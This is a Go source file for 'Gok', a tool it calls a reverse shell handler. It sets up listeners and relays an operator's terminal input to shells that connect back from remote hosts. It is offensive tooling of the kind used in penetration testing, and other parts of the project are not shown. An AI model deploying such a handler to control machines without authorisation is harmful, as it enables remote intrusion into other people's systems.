package main

import (
	"bufio"
	"fmt"
	"io"
	"log"
	"net"
	"os"

	"github.com/alecthomas/kong"
)

//   ▄████  ▒█████   ██ ▄█▀
//  ██▒ ▀█▒▒██▒  ██▒ ██▄█▒
// ▒██░▄▄▄░▒██░  ██▒▓███▄░
// ░▓█  ██▓▒██   ██░▓██ █▄
// ░▒▓███▀▒░ ████▓▒░▒██▒ █▄
//  ░▒   ▒ ░ ▒░▒░▒░ ▒ ▒▒ ▓▒
//   ░   ░   ░ ▒ ▒░ ░ ░▒ ▒░
// ░ ░   ░ ░ ░ ░ ▒  ░ ░░ ░
//       ░     ░ ░  ░  ░
// Gok: Reverse shell handler

const VERSION = "0.0"

func InteractiveShell(conn net.Conn) {
    done := make(chan bool) // Channel for coordination

    // Goroutine 1: Remote -> Local
    go func() {
	io.Copy(os.Stdout, conn) // Copy everything from conn to stdout
	done <- true             // Signal we're done
    }()

    // Goroutine 2: Local <- Remote
    go func() {
	scanner := bufio.NewScanner(os.Stdin)
	for scanner.Scan() {
	    line := scanner.Text() + "\n"
	    conn.Write([]byte(line)) // Send to remote shell
	}
	done <- true // Signal we're done
    }()

    <-done // Block until one goroutine finishes

}

func handleSession(conn net.Conn) {
    defer conn.Close()
    log.Printf("[+] Accepting connection from: %v", conn.RemoteAddr())

    // TODO: FAKE-IT

    InteractiveShell(conn)
}

func main() {
    fmt.Println()
    fmt.Println("\tGOK: Reverse Shell Handler")
    fmt.Println("")
    fmt.Println(
	"\t  ▄████  ▒█████   ██ ▄█▀\n",
	"\t ██▒ ▀█▒▒██▒  ██▒ ██▄█▒ \n",
	"\t▒██░▄▄▄░▒██░  ██▒▓███▄░ \n",
	"\t░▓█  ██▓▒██   ██░▓██ █▄ \n",
	"\t░▒▓███▀▒░ ████▓▒░▒██▒ █▄\n",
	"\t ░▒   ▒ ░ ▒░▒░▒░ ▒ ▒▒ ▓▒\n",
	"\t  ░   ░   ░ ▒ ▒░ ░ ░▒ ▒░\n",
	"\t░ ░   ░ ░ ░ ░ ▒  ░ ░░ ░ \n",
	"\t      ░     ░ ░  ░  ░   \n",
	"")
    fmt.Printf("\tVersion: %s (Alpha)", VERSION)
    fmt.Println()

    kong.Parse(&Flags)

    // log.Printf("Flags: %v", Flags)

    config := Config{
	PortRange: Flags.PortRange,
	bindIps:   Flags.BoundIPs,
    }

    core := NewCore(config)
    core.InitListeners()

    core.RunREPL()

    // done := make(chan bool)
    // <-done  // Will wait forever (nothing sends to it)
}
